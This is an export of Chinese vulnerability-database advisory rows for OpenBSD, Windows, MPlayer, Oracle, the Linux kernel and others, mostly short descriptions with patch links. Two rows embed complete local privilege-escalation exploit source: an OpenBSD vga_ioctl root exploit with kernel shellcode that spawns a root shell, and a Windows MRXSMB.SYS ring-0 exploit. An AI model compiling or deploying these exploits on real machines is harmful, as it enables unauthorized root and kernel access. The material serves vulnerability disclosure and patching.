CNVD-2007-0154,Null,CNVD-2007-0154,2007/1/9,中,(暂无),Getahead Direct Web Remoting (DWR) 1.1.4 之前的版本存在漏洞，攻击者可以通过恶意请求获得访问。,http://www.securityfocus.com/bid/21955,,Null
CNVD-2007-0153,Null,CNVD-2007-0153,2007/1/9,中,(暂无),Getahead Direct Web Remoting (DWR) 1.1.4 之前的版本存在漏洞，攻击者可以通过恶意请求获得访问。,http://www.securityfocus.com/bid/21955,,Null
CNVD-2007-0012,Null,CNVD-2007-0012,2007/1/3,高,(暂无),"OpenBSD 3.9和4.0中的wscons的VGA驱动中的sys/dev/pci/vga_pci.c中存在未公开的漏洞，当编译包含PCIAGP选项和non-AGP驱动的内核时，本地攻击者可以通过未公开漏洞获取权限。测试代码：/* Critical Security OpenBSD 3.x-4.0 vga_ioctl() root exploit Bug had been discovered by allmighty Ilja van Sprundel (ilja.netric.org) Some code had been stolen from noir's openbsd exploit sources Fix is available: ftp://ftp.openbsd.org/pub/OpenBSD/patches/4.0/i386/007_agp.patch Critical Security [http://www.critical.lt], Lithuania, Vilnius, 2007 Linkejimai neegzistuojancio fronto kariams ;] */ #include &lt;sys/param.h> #include &lt;sys/ioctl.h> #include &lt;sys/syscall.h> #include &lt;sys/agpio.h> #include &lt;unistd.h> #include &lt;err.h> #include &lt;fcntl.h> #include &lt;stdlib.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;sys/mman.h> #include &lt;sys/sysctl.h> #define TARGET1 ""\x51\x47\x48\xd0""  /* 0xd0484751 obsd 4.0 generic i386*/ #define TARGET2 ""\xa9\x42\x10\xd0""  /* 0xd01042a9 obsd 3.9 generic i386*/ char shellcode[]= ""\x18\x00\x00\x00"" ""\x18\x00\x00\x00"" ""\x18\x00\x00\x00"" /* some crap */ ""\x18\x00\x00\x00"" ""\x18\x00\x00\x00"" ""\x18\x00\x00\x00"" /* jmp 0x00000018 */ ""\xe8\x0f\x00\x00\x00\x78\x56\x34\x12\xfe\xca\xad"" ""\xde\xad\xde\xef\xbe\x90\x90\x90\x5f\x8b\x0f\x8b"" /* p_cred & u_cred shellcode */ ""\x59\x10\x31\xc0\x89\x43\x04\x8b\x13\x89\x42\x04"" ""\xb8\x51\x47\x48\xd0"" ""\xff\xe0""; void usage() { printf(""Usage: crit_obsd_ex target\n\n""); printf(""valid targets:\n""); printf(""(1)\tobsd 4.0 generic i386\n""); printf(""(2)\tobsd 3.9 generic i386\n\n""); exit(0); } void get_proc(pid_t pid, struct kinfo_proc *kp) {    u_int arr[4], len;         arr[0] = CTL_KERN;         arr[1] = KERN_PROC;         arr[2] = KERN_PROC_PID;         arr[3] = pid;         len = sizeof(struct kinfo_proc);         if(sysctl(arr, 4, kp, &len, NULL, 0) &lt; 0) {                 perror(""sysctl"");                 printf(""this is an unexpected error, rerun!\n"");                 exit(-1);         } } int main(int ac, char *av[]) {         int i;         void *p;         int fd,failas;         u_long  pprocadr;         struct kinfo_proc kp; printf(""\n+--------------------------------------------+\n""); printf(""|     Critical Security local obsd root      |\n""); printf(""+--------------------------------------------+\n\n""); if (ac&lt;2) usage(); if(atoi(av[1])==1) { for(i=0;i&lt;4;i++)shellcode[61+i]=TARGET1[i]; } else if(atoi(av[1])==2) { for(i=0;i&lt;4;i++)shellcode[61+i]=TARGET2[i]; } else {usage();}         get_proc((pid_t) getpid(), &kp);         pprocadr = (u_long) kp.kp_eproc.e_paddr;         shellcode[24+5] = pprocadr & 0xff;         shellcode[24+6] = (pprocadr >> 8) & 0xff;         shellcode[24+7] = (pprocadr >> 16) & 0xff;         shellcode[24+8] = (pprocadr >> 24) & 0xff;         printf(""[~] shellcode size: %d\n"",sizeof(shellcode));         fd=open(""/tmp/. "", O_RDWR|O_CREAT, S_IRUSR|S_IWUSR);         if(fd &lt; 0)                 err(1, ""open"");         write(fd, shellcode, sizeof(shellcode));         if((lseek(fd, 0L, SEEK_SET)) &lt; 0)                 err(1, ""lseek"");         p=mmap(0, sizeof(shellcode), PROT_READ|PROT_EXEC, MAP_FIXED, fd, 0);         if (p == MAP_FAILED)         err(1, ""mmap"");         printf(""[~] map addr: 0x%x\n"",p);         printf(""[~] exploiting...\n"");         failas = open(AGP_DEVICE, O_RDWR);         syscall(SYS_ioctl, failas, 0x80044103, NULL);         close(failas);         close(fd);         seteuid(0);         setuid(0);         printf(""[~] uid: %d euid: %d gid: %d \n"", getuid(), geteuid(),getgid());         execl(""/bin/sh"", ""cyber"", NULL); }修补方案：OpenBSD已经发布补丁，下载地址：ftp://ftp.openbsd.org/pub/OpenBSD/patches/4.0/i386/007_agp.patchftp://ftp.openbsd.org/pub/OpenBSD/patches/3.9/i386/017_agp.patch",http://www.openbsd.org/errata39.html#agp,,Null
CNVD-2006-4486,Null,CNVD-2006-4486,2006/6/13,高,(暂无),"危害本地攻击者可以利用漏洞进行缓冲区溢出攻击，提升特权。攻击所需条件攻击者必须访问Microsoft Windows。漏洞信息Microsoft Windows是一款流行的操作系统。Microsoft SMB驱动不正确验证用户模式缓冲区，本地攻击者可以利用漏洞进行缓冲区溢出攻击，提升特权。问题是由于microsoft客户端缓存(CSCDLL.DLL)和Microsoft服务器消息块重定向驱动(MRXSMB.SYS)代码中存在逻辑错误，microsoft客户端缓存架构提供""离线""子系统的用户模式部分，允许当离线时与网络文件交互并保持文件系统权限，Microsoft服务器消息块重定向驱动是内核模式文件系统驱动，提供CSC使用的网络重定向功能。MRXSMB.SYS通过IOCTL命令列出，MrxSmbCscIoctlOpenForCopyChunk()函数中存在一个访问验证错误，为了使用MRXSMB子系统建立连接，会建立一个映象设备的文件处理句柄，并且DeviceIoControl()用于发布命令，如果攻击者利用METHOD_NEITHER方法标记，地址就没有被正确检查，可以覆盖内核内存，并导致RING0代码执行。测试方法///////////////////////////////////////////////////////////////////////////////////////// Mrxsmb.sys XP & 2K Ring0 Exploit (6/12/2005)// Tested on XP SP2 && 2K SP4 // Disable ReadOnly Memory protection// HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\EnforceWriteProtection = 0// -----------------------------------------------------------------------------------// ONLY FOR EDUCATIONAL PURPOSES.// -----------------------------------------------------------------------------------// Rub鮠Santamarta.// www.reversemode.com// -----------------------------------------------------------------------------------// OVERVIEW// -----------------------------------------------------------------------------------// There are 3 possible values to change in order to adjust the exploit to other versions.// # XPSP2 (XP Service Pack 2)// This variable is equal to the File offset of the Call that we are modifying minus 0xC//. #XPSP2 => 3D88020000                   cmp         eax,000000288//.           770B                         ja         .000064BBE  --//.           50                           push        eax//.           51                           push        ecx//.           E812E2FFFF                   call       .000062DCC  -- MODIFIED CALL --// -----------------------------------------------------------------------------------// #W2KSP4 (Windows 2000 Service Pack 4)// The same method previosly explained but regarding to Windows 2000 Service Pack 4.// -----------------------------------------------------------------------------------// $OffWord// This variable is defined in CalcJump() Function. // E812E2FFFF  call       .000062DCC  -- MODIFIED CALL -- // The exploit calculates automatically the relative jump, but we need to provide it// the 2 bytes following opcode Call(0xE8). In example, as we can see, to test in XP// OffWord will be equal to 0xE212.//////////////////////////////////////////////////////////////////////////////////////#include &lt;windows.h>#include &lt;stdio.h>#define XPSP2		0x54BAC  #define W2KSP4		0x50ADD#define MAGIC_IOCTL 0x141043typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,									DWORD ,									LPDWORD);typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,									LPTSTR lpBaseName,									DWORD nSize);VOID ShowError(){ LPVOID lpMsgBuf; FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,               NULL,               GetLastError(),               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),               (LPTSTR) &lpMsgBuf,               0,               NULL); MessageBoxA(0,(LPTSTR)lpMsgBuf,""Error"",0); exit(1);}DWORD CalcJump(DWORD BaseMRX,BOOL InXP,DWORD *hValue,DWORD *ShellAddr){      DWORD SumTemp;      DWORD IniAddress;	  DWORD i;	  DWORD sumAux;	  DWORD addTemp;	  DWORD OffWord;	  	  if(InXP)	  {		SumTemp=BaseMRX+XPSP2+0xE;	    OffWord=0xE212;	  }	  else	  {	    SumTemp=BaseMRX+W2KSP4+0xE;		OffWord=0xa971;	  }				  for(i=0x4c;i&lt;0xDDDC;i=i+4)	  {   		sumAux=~((i*0x10000)+OffWord);		addTemp=SumTemp-sumAux;		if(addTemp>0xE000000 && addTemp&lt;0xF000000){				IniAddress=addTemp&0xFFFFF000;				*hValue=i-4;				*ShellAddr=addTemp;				break;		}	  }	  printf(""\nINFORMATION \n"");	  printf(""-----------------------------------------------------\n"");      printf(""Patched Driver Call pointing to \t [0x%p]\n"",addTemp);	        return (IniAddress);} int main(int argc, char *argv[]){ PENUMDEVICES pEnumDeviceDrivers; PGETDEVNAME  pGetDeviceDriverBaseName; LPVOID arrMods[200],addEx; DWORD cb,i,devNum,dwTemp,hValue,Ring0Addr,junk,ShellAddr,BaseMRX=0; DWORD *OutBuff,*InBuff; HANDLE hDevice; BOOL InXP; CHAR baseName[255]; CONST CHAR Ring0ShellCode[]=""\xCC"";       //""PUT YOUR RING0 CODE HERE :)""  if(argc&lt;2) {  printf(""\nMRXSMB.SYS RING0 Exploit\n"");  printf(""--- Ruben Santamarta ---\n"");  printf(""Tested on XPSP2 & W2KSP4\n"");  printf(""\nusage> exploit.exe &lt;XP> or &lt;2K>\n"");  exit(1); }  if(strncmp(argv[1],""XP"",2)==0)	 InXP=TRUE; else	 InXP=FALSE; pEnumDeviceDrivers=(PENUMDEVICES)GetProcAddress(LoadLibrary(""psapi.dll""),												 ""EnumDeviceDrivers""); pGetDeviceDriverBaseName=(PGETDEVNAME)GetProcAddress(LoadLibrary(""psapi.dll""),												 ""GetDeviceDriverBaseNameA""); pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb); devNum=cb/sizeof(LPVOID); printf(""\nSearching Mrxsmb.sys Base Address...""); for(i=1;i&lt;=devNum;i++) {       pGetDeviceDriverBaseName(arrMods[i],baseName,254);	   if((strncmp(baseName,""mrxsmb"",6)==0))	   {	  	   printf(""[%x] Found!\n"",arrMods[i]);		   BaseMRX=(DWORD)arrMods[i];	   } } if(!BaseMRX) {	 printf(""Not Found\nExiting\n\n"");	 exit(1); } addEx=(LPVOID)CalcJump(BaseMRX,InXP,&hValue,&ShellAddr); OutBuff=(DWORD*)VirtualAlloc((LPVOID)addEx,0xF000,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);  if(!OutBuff) ShowError(); printf(""F000h bytes allocated  at \t\t [0x%p]\n"",addEx); printf(""Value needed   \t\t\t	 [0x%p]\n"",hValue+4); InBuff=OutBuff;  printf(""Checking Shadow Device...""); hDevice = CreateFile(""\\\\.\\shadow"",                    FILE_EXECUTE,                    FILE_SHARE_READ|FILE_SHARE_WRITE,                    NULL,                    OPEN_EXISTING,                    0,                    NULL);   if (hDevice == INVALID_HANDLE_VALUE) ShowError(); printf(""[OK]\n"");  printf(""Querying Device...\n""); while(OutBuff[3]&lt; hValue)  {			DeviceIoControl(hDevice,      // ""\\.\shadow""                            MAGIC_IOCTL,  // Privileged IOCTL                            InBuff, 2,    // InBuffer, InBufferSize                            OutBuff, 0x18,// OutBuffer,OutBufferSize                            &junk,        // bytes returned                            (LPOVERLAPPED) NULL);    printf(""\r\t[->]VALUES: (%x)"",OutBuff[3]);  }  if(InXP)	  Ring0Addr=BaseMRX+XPSP2;  else	  Ring0Addr=BaseMRX+W2KSP4;     printf(""Overwritting Driver Call at[%x]..."",Ring0Addr);  DeviceIoControl(hDevice,      // ""\\.\shadow""                            MAGIC_IOCTL,  // Privileged IOCTL                            InBuff, 2,    // InBuffer, InBufferSize                            (LPVOID)Ring0Addr, 0x18,// OutBuffer,OutBufferSize 0x                            &junk,        // bytes returned                            (LPOVERLAPPED) NULL);    printf(""[OK]\n"");  for(i=1;i&lt;0x3C00;i++) OutBuff[i]=0x90909090;    memcpy((LPVOID*)ShellAddr,(LPVOID*)Ring0ShellCode,sizeof(Ring0ShellCode));     printf(""Sending IOCTL to execute the ShellCode\n"");    DeviceIoControl(hDevice,      // ""\\.\shadow""                            MAGIC_IOCTL,  // Privileged IOCTL                            InBuff, 2,    // InBuffer, InBufferSize                            OutBuff, 0x18,// OutBuffer,OutBufferSize                            &junk,        // bytes returned                            (LPOVERLAPPED) NULL);  dwTemp=CloseHandle(hDevice);  if(!dwTemp) ShowError();  dwTemp=VirtualFree(OutBuff,0xf000,MEM_DECOMMIT);  if(!dwTemp) ShowError();  return(1);}厂商解决方案补丁下载：Microsoft Windows Server 2003 Datacenter Edition SP1Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows Server 2003 Datacenter x64 Edition Microsoft Security Update for Windows Server 2003 x64 Edition (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=b6018a61-b0ec -467e-9025-059d3c9f1c5fMicrosoft Windows Server 2003 Enterprise Edition SP1Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows XP Media Center Edition SP2Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows Server 2003 Datacenter Edition Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows 2000 Advanced Server SP4Microsoft Security Update for Windows 2000 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=6ec86784-6b12 -410b-8068-028c58ed5df7Microsoft Windows Server 2003 Enterprise Edition 64-bit SP1Microsoft Security Update for Windows Server 2003 for Itanium-based Systems (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=e1d13c18-72d1 -40b8-95b3-08aef8db9213Microsoft Windows XP Tablet PC Edition SP1Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows Server 2003 Enterprise Edition Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows XP Home SP2Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows 2000 Datacenter Server SP4Microsoft Security Update for Windows 2000 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=6ec86784-6b12 -410b-8068-028c58ed5df7Microsoft Windows XP Tablet PC Edition SP2Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows XP Media Center Edition SP1Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows Server 2003 Web Edition Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows XP Home SP1Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows XP Professional x64 Edition Microsoft Security Update for Windows XP x64 Edition (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=89fbbdd0-7504 -4807-9337-08324aa457e7Microsoft Windows Server 2003 Web Edition SP1Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows Server 2003 Enterprise Edition 64-bit Microsoft Security Update for Windows Server 2003 for Itanium-based Systems (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=e1d13c18-72d1 -40b8-95b3-08aef8db9213Microsoft Windows Server 2003 Standard Edition SP1Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows Server 2003 Standard Edition Microsoft Security Update for Windows Server 2003 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=43d69a41-6acb -4c64-89dc-2b9aef6e98fdMicrosoft Windows Server 2003 Datacenter Edition 64-bit SP1Microsoft Security Update for Windows Server 2003 for Itanium-based Systems (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=e1d13c18-72d1 -40b8-95b3-08aef8db9213Microsoft Windows XP Professional SP2Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows Server 2003 Standard x64 Edition Microsoft Security Update for Windows Server 2003 x64 Edition (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=b6018a61-b0ec -467e-9025-059d3c9f1c5fMicrosoft Windows 2000 Server SP4Microsoft Security Update for Windows 2000 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=6ec86784-6b12 -410b-8068-028c58ed5df7Microsoft Windows 2000 Professional SP4Microsoft Security Update for Windows 2000 (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=6ec86784-6b12 -410b-8068-028c58ed5df7Microsoft Windows Server 2003 Enterprise x64 Edition Microsoft Security Update for Windows Server 2003 x64 Edition (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=b6018a61-b0ec -467e-9025-059d3c9f1c5fMicrosoft Windows XP Professional SP1Microsoft Security Update for Windows XP (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=c17ddc07-204b -4a7f-8c5a-36b7865a030cMicrosoft Windows Server 2003 Datacenter Edition 64-bit Microsoft Security Update for Windows Server 2003 for Itanium-based Systems (KB914389)http://www.microsoft.com/downloads/details.aspx?familyid=e1d13c18-72d1 -40b8-95b3-08aef8db9213",http://oval.mitre.org/repository/data/getDef?id=oval:org.mitre.oval:def:1730,,Null
CNVD-2006-1914,Null,CNVD-2006-1914,2006/3/29,中,(暂无),"MPlayer是一款开放源代码的媒体播放程序。MPlayer存在多个整数溢出，远程攻击者可以利用漏洞以应用程序进程权限执行任意指令。问题一是libmpdemux/asfheader.c- -----------------------------------    218           asf_scrambling_h=buffer[0];    219           asf_scrambling_w=(buffer[2]&lt;&lt;8)|buffer[1];    220           asf_scrambling_b=(buffer[4]&lt;&lt;8)|buffer[3];    221           asf_scrambling_w/=asf_scrambling_b;char转换成Int，Int值可以为负值导致asf_descrambling()堆缓冲区溢出。[2]in libmpdemux/aviheader.c- -----------------------------------    218       s->wLongsPerEntry = stream_read_word_le(demuxer->stream);    219       s->bIndexSubType = stream_read_char(demuxer->stream);    220       s->bIndexType = stream_read_char(demuxer->stream);    221       s->nEntriesInUse = stream_read_dword_le(demuxer->stream);    222       *(uint32_t *)s->dwChunkId =stream_read_dword_le(demuxer->stream);    223       stream_read(demuxer->stream, (char *)s->dwReserved, 3*4);    224       memset(s->dwReserved, 0, 3*4);    225    226       print_avisuperindex_chunk(s,MSGL_V);    227    228       msize = sizeof (uint32_t) * s->wLongsPerEntry *s->nEntriesInUse;[ERROR]    229       s->aIndex = malloc(msize);    230       memset (s->aIndex, 0, msize);    231       s->stdidx = malloc (s->nEntriesInUse * sizeof(avistdindex_chunk));[ERROR]    232       memset (s->stdidx, 0, s->nEntriesInUse * sizeof(avistdindex_chunk));    233    234       // now the real index of indices    235       for (i=0; i&lt;s->nEntriesInUse; i++) {    236           chunksize-=16;    237           s->aIndex[i].qwOffset =stream_read_dword_le(demuxer->stream) & 0xffffffff;    238           s->aIndex[i].qwOffset |=((uint64_t)stream_read_dword_le(demuxer->stream) & 0xffffffff)&lt;&lt;32;    239           s->aIndex[i].dwSize =stream_read_dword_le(demuxer->stream);    240           s->aIndex[i].dwDuration =stream_read_dword_le(demuxer->stream);    241           mp_msg (MSGT_HEADER, MSGL_V, ""ODML (%.4s): [%d]0x%016""PRIx64"" 0x%04x %u\n"",    242                   (s->dwChunkId), i,    243                   (uint64_t)s->aIndex[i].qwOffset,s->aIndex[i].dwSize, s->aIndex[i].dwDuration);    244       }[ERROR]其中两个整数溢出可导致基于堆的缓冲区溢出。构建恶意媒体程序，诱使用户播放，可导致以应用程序权限执行任意指令。",http://www.xfocus.net/articles/200603/861.html,,Null
CNVD-2005-0299,Null,CNVD-2005-0299,2005/1/24,高,(暂无),"Oracle Database 10g, Oracle9i Database Server, Oracle8i Database Server, Oracle8 Database, Oracle Collaboration Suite, Oracle Application Server, 和 Oracle E-Business Suite 存在多个漏洞。Oracle 已经发布重要的补丁包修补这些漏洞。下面是存在漏洞的列表：Oracle8 数据库的一个网络组件存在漏洞。Oracle8i数据库的LOB组件存在信息泄漏漏洞。Oracle8i数据库服务器Spatial组件存在漏洞。Oralce9i数据库服务器Release 2的UTL_FILE组件存在漏洞。Oracle8i数据库Diagnostic组件存在漏洞。Oracle 10g数据库和Oracle9i数据库Release 2的XDB组件存在多个漏洞。Oracle 10g数据库Dataguard组件存在漏洞。Oracle9i 数据库Release 2 Log Miner组件存在漏洞。Oracle9i 数据库Release 2 OLAP组件存在漏洞。Oracle 10g数据库Data Mining组件存在漏洞。Oracle 10g数据库Advanced Queuing组件存在漏洞。 Oracle 10g数据库Change Data Capture组件存在多个漏洞。 Oracle 10g数据库Database Core组件存在漏洞。Oracle 10g数据库OHS组件存在漏洞。 Oracle Application Server的Report Server组件存在漏洞。Oracle Application Server的Forms组件存在漏洞。 Oracle Application Server的mod_plsql组件存在漏洞。. Oracle Collaboration Suite的Calendar组件存在漏洞。Oracle E-Business Suite存在多个漏洞。Oracle 安全公告仅仅公开了这些收影响产品，更早版本可能同样存在这些漏洞。这个重要的补丁同时包括Oracle Security Alert #68修复了bugtraq 10871(Oracle多个未公开的漏洞)和bugtraq 11120 (Oracle Database 9i SQL 命令缓冲区溢出漏洞)和bugtraq 11099 (Oracle Database Server ctxsys.driload 访问控制漏洞)和bugtraq 11100 (Oracle Database Server dbms_system.ksdwrt 远程缓冲区溢出漏洞)和bugtraq 11091 (Oracle 10g Database DBMS_SCHEDULER 远程命令执行漏洞)。修补方案： Oracle已经发布一个重要的补丁来修补这些漏洞，详细信息参考下面的链接： Oracle数据库补丁的相关信息：http://metalink.oracle.com/metalink/plsql/ml2_documents.showDocument?p_database_id=NOT&p_id=293737.1 Oracle Application Server 补丁的详细信息：http://metalink.oracle.com/metalink/plsql/ml2_documents.showDocument?p_database_id=NOT&p_id=293738.1 Oracle Collaboration Suite 补丁的详细信息：http://metalink.oracle.com/metalink/plsql/ml2_documents.showDocument?p_database_id=NOT&p_id=293740.1 Oracle E-Business 补丁的详细信息：http://metalink.oracle.com/metalink/plsql/ml2_documents.showDocument?p_database_id=NOT&p_id=293741.1",http://www.securityfocus.com/bid/12301,,Null
CNVD-2004-1719,Null,Linux Kernel I2C驱动另一个整数溢出漏洞,2004/6/17,低,(暂无),"Linux是一款开放源代码操作系统。Linux中的I2C总线驱动程序不正确验证用户提供的Size值，本地攻击者可以利用这个漏洞获得ring 0级别的权限。问题存在于i2cdev_ioctl()函数中的I2C_RDWR选项：---case I2C_RDWR:if (copy_from_user(&rdwr_arg,(structi2c_rdwr_ioctl_data *)arg,sizeof(rdwr_arg)))return -EFAULT;rdwr_pa = (struct i2c_msg *)kmalloc(rdwr_arg.nmsgs *sizeof(struct i2c_msg),GFP_KERNEL);if (rdwr_pa == NULL) return -ENOMEM;---由于缺少过滤检查，在kmalloc()调用中使用的(rdwr_arg.nmsgs * sizeof(struct i2c_msg))会导致触发整数溢出。如果用户提供一个超大的整数用于kmalloc()调用中的长度参数，会由于分配过小的内存而使kmalloc()发生整数溢出，可导致系统崩溃等问题。不过多数情况下I2C驱动文件默认只允许管理员可读和写，因此攻击者一般需要ROOT的权限来利用此漏洞。",http://marc.theaimsgroup.com/?l=bugtraq&m=108761485905678&w=2,目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：Linux Upgrade linux-2.4.21.tar.bz2http://www.kernel.org/pub/linux/kernel/v2.4/linux-2.4.21.tar.bz2Linux Upgrade linux-2.4.22.tar.gzftp://ftp.kernel.org/pub/linux/kernel/v2.4/linux-2.4.22.tar.gzLinux Upgrade linux-2.4.23.tar.gzftp://ftp.kernel.org/pub/linux/kernel/v2.4/linux-2.4.23.tar.gzLinux Upgrade linux-2.4.24.tar.bz2http://www.kernel.org/pub/linux/kernel/v2.4/linux-2.4.24.tar.bz2Linux Upgrade linux-2.4.25.tar.bz2http://www.kernel.org/pub/linux/kernel/v2.4/linux-2.4.25.tar.bz2Linux Upgrade linux-2.4.26.tar.bz2http://www.kernel.org/pub/linux/kernel/v2.4/linux-2.4.26.tar.bz2,Linux Kernel I2C驱动另一个整数溢出漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/42844
CNVD-2003-3546,Null,Cdwrite以不安全方式创建临时文件漏洞,2003/12/6,中,Cdwrite Cdwrite 1.3   ;   ,Cdwrite是一款基于SHELL的刻录工具。Cdwrite以不安全方式在临时目录中建立临时文件，本地攻击者可以利用这个漏洞通过符号链接进行攻击，可导致文件系统破坏。Cdwrite 1.3使用时会建立/tmp/.tempfile文件，由于没有对文件是否存在进行检查，并且临时文件名可猜测，因此攻击者可以建立一个tmp文件的符号链接，到任意系统文件中，运行Cdwrite时可导致连接的文件被破坏或修改，可产生拒绝服务，或者可能进行权限提升。,http://www.securityfocus.com/bid/9165/info,目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://c.kruk.webpark.pl/#cdwrite,Null
CNVD-2003-2362,Null,CNVD-2003-2362,2003/7/31,高,(暂无),Oracle Applications Web Report Review (FNDWRR)程序用于查看报告和日志。FNDWRR是CGI程序实现。FNDWRR程序不正确处理用户提交的超长URI请求，远程攻击者可以利用这个漏洞可能以WEB权限在系统上执行任意指令。,http://marc.theaimsgroup.com/?l=bugtraq&m=105906721920776&w=2,,Null
CNVD-2003-2291,Null,CNVD-2003-2291,2003/7/24,高,(暂无),Oracle E-Business Suite Release 其11.0版本及11.5.1 至 11.5.8版本中的Oracle Applications Web Report Review (FNDWRR) CGI应用程序存在缓冲区溢出漏洞。远程攻击者可以通过一个超长的URL链接，执行任意代码。,http://marc.theaimsgroup.com/?l=bugtraq&m=105906721920776&w=2,,Null
CNVD-1999-0071,Null,CNVD-1999-0071,2019/12/1,中,(暂无),Red Hat Linux 5.1中的dumpreg 程序按O_RDWR 方式打开/dev/mem这使得本地用户能够发动DOS攻击。,http://marc.theaimsgroup.com/?l=bugtraq&m=90221104526185&w=2,,Null
CNVD-2012-4338,Null,xmlsd 'xmlsd_chardata()'单字节错误缓冲区溢出漏洞,2012/8/21,高,xmlsd xmlsd 0.x   ;   ,"xmlsd是一个封装expat的库，可简化在C程序中使用XML。当解析XML文档时""xmlsd_chardata()""函数(xmlsd.c)存在单字节溢出错误。允许攻击者利用漏洞进行缓冲区溢出，成功利用漏洞可执行任意代码。",http://secunia.com/advisories/50293/,xmlsd 0.9.0已经修复此漏洞，建议用户下载使用：https://opensource.conformal.com/,xmlsd 'xmlsd_chardata()'单字节错误缓冲区溢出漏洞的补丁:http://www.cnvd.org.cn/patchInfo/show/19991
